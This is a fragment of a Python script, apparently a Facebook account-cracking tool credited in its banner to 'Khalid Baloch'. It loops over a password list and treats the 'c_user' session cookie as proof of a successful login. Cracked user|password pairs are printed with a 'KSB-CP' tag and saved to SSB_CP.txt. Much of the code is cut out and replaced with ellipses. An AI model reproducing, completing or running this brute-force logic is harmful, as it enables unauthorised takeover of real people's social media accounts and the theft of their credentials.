...
logo =                                          """   
   ...
   \033[1;37m ######      ######     ########  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Khalid Baloch
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Khalid Baloch
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           KSBN786
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s [KSB-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
                    break
